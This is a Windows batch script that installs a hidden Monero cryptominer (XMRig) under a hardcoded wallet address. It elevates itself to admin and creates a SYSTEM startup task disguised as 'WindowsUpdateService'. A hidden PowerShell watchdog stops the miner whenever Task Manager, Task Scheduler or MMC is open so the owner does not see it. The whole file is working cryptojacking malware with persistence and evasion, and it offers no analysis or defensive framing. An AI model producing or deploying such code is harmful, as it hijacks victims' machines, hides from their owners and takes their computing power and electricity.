@echo off
:: One batch to rule them all
:: Run once as admin. It sets up persistence and starts mining.

:: If run with the watchdog argument, enter the watchdog loop
if "%1"=="--watchdog" goto watchdog

:: Otherwise, do the setup (run as admin if needed)
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -ArgumentList '--watchdog'"
    exit /b
)

:: Setup: kill old miner, create config, start miner, create task
cd /d "%~dp0"

taskkill /f /im xmrig.exe >nul 2>&1

if not exist "config.json" (
    (
    echo {
    echo     "autosave": true,
    echo     "cpu": {
    echo         "enabled": true,
    echo         "huge-pages": true,
    echo         "hw-aes": true,
    echo         "max-threads-hint": 50,
    echo         "asm": true,
    echo         "memory-pool": false,
    echo         "yield": true
    echo     },
    echo     "pools": [
    echo         {
    echo             "url": "stratum+tcp://pool.moneroocean.stream:10128",
    echo             "user": "42CH5YT79MJhEPZvaUQRBz2TsTanEmaSPZz9nwfcDQ5kTCGPC5UvKudgHCXfAYPq51eqazWn5tZbqhUGTYkkxcDSF5tK61f.%COMPUTERNAME%_%RANDOM%",
    echo             "pass": "x",
    echo             "tls": true,
    echo             "keepalive": true,
    echo             "nicehash": false
    echo         }
    echo     ],
    echo     "api": { "enabled": false },
    echo     "http": { "enabled": false }
    echo }
    ) > config.json
)

:: Start miner hidden
start /min xmrig.exe -c config.json --no-console --background

:: Create scheduled task if not exists (points to itself with --watchdog)
schtasks /query /tn "WindowsUpdateService" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "WindowsUpdateService" /tr "\"%~f0\" --watchdog" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
)

exit /b

:watchdog
:: PowerShell watchdog loop (runs hidden, kills miner when Task Manager opens)
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
$minerPath = '%~dp0xmrig.exe';
$configPath = '%~dp0config.json';
$minerProcess = Start-Process -FilePath $minerPath -ArgumentList '-c $configPath --no-console --background' -PassThru -WindowStyle Hidden;
while ($true) {
    $tools = Get-Process -Name 'taskmgr','taskschd','mmc' -ErrorAction SilentlyContinue;
    if ($tools) {
        if ($minerProcess -and !$minerProcess.HasExited) { Stop-Process -Id $minerProcess.Id -Force }
        while (Get-Process -Name 'taskmgr','taskschd','mmc' -ErrorAction SilentlyContinue) { Start-Sleep -Seconds 2 }
        $minerProcess = Start-Process -FilePath $minerPath -ArgumentList '-c $configPath --no-console --background' -PassThru -WindowStyle Hidden
    }
    Start-Sleep -Seconds 1
}
"